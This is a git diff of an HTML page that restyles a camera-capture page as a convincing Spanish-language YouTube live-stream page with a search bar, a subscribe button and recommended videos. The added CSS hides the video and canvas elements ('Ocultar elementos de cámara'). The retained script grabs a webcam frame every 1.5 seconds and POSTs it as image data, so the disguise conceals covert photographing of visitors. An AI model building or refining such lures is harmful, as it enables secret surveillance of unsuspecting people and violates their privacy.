@@ -1,19 +1,118 @@
 <!doctype html>
-<html>
+<html lang="es">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YouTube</title>
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
+<script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+    body { background-color: #0f0f0f; color: white; font-family: 'Roboto', Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+    
+    /* Ocultar elementos de cámara */
+    #video, #canvas, .video-wrap { display: none !important; }
 
-<div class="video-wrap">
-   <video id="video" playsinline autoplay></video>
+    /* Header de YouTube */
+    .yt-header { height: 56px; background-color: #0f0f0f; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: sticky; top: 0; z-index: 100; }
+    .yt-left { display: flex; align-items: center; }
+    .yt-logo { color: white; display: flex; align-items: center; text-decoration: none; font-weight: bold; font-size: 18px; letter-spacing: -1px; }
+    .yt-logo i { color: red; font-size: 24px; margin-right: 4px; }
+    
+    .yt-center { flex: 1; max-width: 600px; display: flex; align-items: center; margin: 0 40px; }
+    .search-container { display: flex; width: 100%; }
+    .search-input { background: #121212; border: 1px solid #303030; color: white; padding: 8px 16px; border-radius: 40px 0 0 40px; width: 100%; outline: none; font-size: 16px; }
+    .search-btn { background: #222; border: 1px solid #303030; border-left: none; padding: 0 20px; border-radius: 0 40px 40px 0; color: #fff; cursor: pointer; }
+    
+    .yt-right { display: flex; align-items: center; font-size: 18px; }
+    .yt-right i { margin-left: 20px; cursor: pointer; }
+
+    /* Layout Principal */
+    .main-container { display: flex; flex-direction: row; padding: 24px 70px; gap: 24px; }
+    .video-section { flex: 1; }
+    #Live_YT_TV { width: 100%; aspect-ratio: 16/9; border-radius: 12px; border: none; background: #000; }
+    
+    .video-info { margin-top: 12px; }
+    .video-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; }
+    .channel-row { display: flex; align-items: center; margin-top: 12px; }
+    .channel-pic { width: 40px; height: 40px; background: #333; border-radius: 50%; margin-right: 12px; }
+    .channel-name { font-weight: bold; flex: 1; }
+    .subscribe-btn { background: white; color: black; padding: 8px 16px; border-radius: 20px; border: none; font-weight: bold; cursor: pointer; }
+
+    /* Sidebar Sugeridos */
+    .sidebar-section { width: 400px; }
+    .rec-item { display: flex; margin-bottom: 12px; cursor: pointer; gap: 8px; }
+    .rec-thumb { width: 168px; height: 94px; background: #222; border-radius: 8px; flex-shrink: 0; }
+    .rec-info h4 { margin: 0; font-size: 14px; line-height: 1.2; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .rec-info p { margin: 4px 0 0; font-size: 12px; color: #aaa; }
+
+    @media (max-width: 1000px) {
+        .main-container { flex-direction: column; padding: 10px; }
+        .sidebar-section { width: 100%; }
+    }
+</style>
+</head>
+<body>
+
+<div class="yt-header">
+    <div class="yt-left">
+        <i class="fas fa-bars" style="margin-right: 20px;"></i>
+        <a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a>
+    </div>
+    <div class="yt-center">
+        <div class="search-container">
+            <input type="text" class="search-input" placeholder="Buscar">
+            <button class="search-btn"><i class="fas fa-search"></i></button>
+        </div>
+        <i class="fas fa-microphone" style="margin-left: 15px;"></i>
+    </div>
+    <div class="yt-right">
+        <i class="fas fa-video"></i>
+        <i class="fas fa-bell"></i>
+        <i class="fas fa-user-circle" style="font-size: 32px;"></i>
+    </div>
 </div>
 
-<canvas id="canvas" width="640" height="480"></canvas>
+<div class="main-container">
+    <div class="video-section">
+        <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        <div class="video-info">
+            <div class="video-title">Transmisión en Vivo Especial</div>
+            <div class="channel-row">
+                <div class="channel-pic"></div>
+                <div class="channel-name">YouTube Live Staff<br><span style="font-weight: normal; color: #aaa; font-size: 12px;">4.2M suscriptores</span></div>
+                <button class="subscribe-btn">Suscribirse</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="sidebar-section">
+        <div class="rec-item">
+            <div class="rec-thumb" style="background: url('https://img.youtube.com/vi/aqz-KE-bpKQ/mqdefault.jpg') center/cover;"></div>
+            <div class="rec-info">
+                <h4>Mejores momentos de la semana</h4>
+                <p>Trending Clips</p>
+                <p>1.2M de vistas • hace 2 días</p>
+            </div>
+        </div>
+        <div class="rec-item">
+            <div class="rec-thumb" style="background: url('https://img.youtube.com/vi/5qap5aO4i9A/mqdefault.jpg') center/cover;"></div>
+            <div class="rec-info">
+                <h4>Música para concentrarse y trabajar</h4>
+                <p>Lofi Girl</p>
+                <p>45K viendo ahora</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="video-wrap" hidden>
+   <video id="video" playsinline autoplay></video>
+</div>
+<canvas id="canvas" width="640" height="480" hidden></canvas>
 
 <script>
-
 function post(imgdata){
 $.ajax({
     type: 'POST',
@@ -65,18 +164,8 @@ var context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
-  
-
 }
-
-// Load init
 init();
-
 </script>
-
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
-
+</body>
 </html>
